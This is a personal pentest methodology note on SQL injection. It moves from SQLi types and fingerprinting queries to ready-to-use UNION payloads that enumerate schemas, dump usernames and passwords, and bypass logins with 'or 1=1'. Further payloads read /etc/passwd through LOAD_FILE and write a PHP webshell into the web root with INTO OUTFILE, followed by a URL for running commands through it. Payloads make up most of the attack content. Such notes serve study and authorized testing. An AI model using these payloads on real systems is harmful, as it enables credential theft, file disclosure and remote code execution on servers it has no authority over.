---
type: methodology
category: web-pentesting
tags:
  - sql-injection
  - sqli
  - web
  - database
aliases:
  - SQL Injection
  - SQLi Methodology
---
# SQL Injection (SQLi) Methodology

**Description:** Vulnerability that occurs when user-supplied input is improperly sanitized and concatenated directly into a database query, allowing an attacker to interfere with the queries the application makes to its database.

---

## 00 - Information
### SQLi Types & Classification

| Type | Mechanism | Primary Indicator / Indicator Goal |
| :--- | :--- | :--- |
| **In-Band (Classic)** | Same channel is used for attack and results. | **Error-based** (database throws descriptive error messages) or **Union-based** (`UNION SELECT`). |
| **Inferential (Blind)** | No data is displayed directly in the web page. | **Boolean-based** (page changes based on True/False condition) or **Time-based** (`SLEEP()`, `WAITFOR DELAY`). |
| **Out-of-Band (OOB)** | Data is retrieved via alternative channels. | DNS or HTTP requests triggered from the database server (`LOAD_FILE()`, `xp_cmdshell`). |
### Operator Prcedences
Operator precedences are shown in the following list, from highest precedence to the lowest. Operators that are shown together on a line have the same precedence.

```sql
INTERVAL
BINARY, COLLATE
!
- (unary minus), ~ (unary bit inversion)
^
*, /, DIV, %, MOD
-, +
<<, >>
&
|
= (comparison), <=>, >=, >, <=, <, <>, !=, IS, LIKE, REGEXP, IN, MEMBER OF
BETWEEN, CASE, WHEN, THEN, ELSE
NOT
AND, &&
XOR
OR, ||
= (assignment), :=
```

---

## 01 - Enumeration
### Check if Application is Vulnerable to SQLi
Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

> [!INFO] Note
In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.
### Enumerating webserver
As an initial guess, if the webserver we see in HTTP responses is `Apache` or `Nginx`, it is a good guess that the webserver is running on Linux, so the DBMS is likely `MySQL`. The same also applies to Microsoft DBMS if the webserver is `IIS`, so it is likely to be `MSSQL`. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server. So, there are different queries we can test to fingerprint the type of database we are dealing with.

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

### ENUM DB's
The `SCHEMA_NAME` column contains all the database names currently present:
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
Example with Union:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
##### 1. ENUM current DB with Union
```sql
cn' UNION select 1,database(),2,3-- -
```

##### 2.  ENUM tables of  DB with Union
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

##### 3. ENUM columns of table with Union
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

##### 4. DUMP data of columns with Union
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

### ENUM DB User

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
or
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

#### ENUM super admin Privileges
Check if our current user has `super admin` privileges:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

#### ENUM other Privileges
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
## 02 - Common Syntaxes
### OR 1 = 1
An example of a condition that will always return `true` is `'1'='1'`. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.
```sql
admin' or '1'='1
```
Here is an example of what the exact `sql-query` could look like:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
### Read Files
#### LOAD_FILE
The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name.
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

### Write Files
To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled (See ENUM-Part)
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

#### Check if "secure_file_priv" is enabled
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

#### SELECT INTO OUTFILE
To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the `users` table into the `/tmp/credentials` file:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

##### Example Webshell upload
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
After uploading the webshell, commands can be included in the URL: `http://SERVER_IP:PORT/shell.php?0=ls+-la`


### Using Comments
Comments can be used to mark everything that follows as a comment, i.e. to prevent  the execution of following commands, such as password query.
```sql
idk' or id='5') -- 
```

Here is an example of what the full `sql-query` could look like:
```sql
SELECT * FROM logins WHERE (username='idk' or id='5') -- ' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```

### Union
#### Union Clause
We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to `SELECT`, we can put junk data (e.g. 1, 2, 3, etc.) for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.

```sql
SELECT * from employees UNION SELECT <columne1>, <columne2>, 3, 4 ,5 ,6 from departments;
```

#### Union Injection
Enumerating number of columns: 
with `ORDER` (we will start with one and go up by one until we receive an error)
```sql
cn' ORDER BY 1-- -
```
with`UNION`:
```sql
cn' UNION SELECT 1,2,3,4 -- -
```

Injecting command:
```sql
cn' UNION SELECT 1,2,user(),4 -- -
```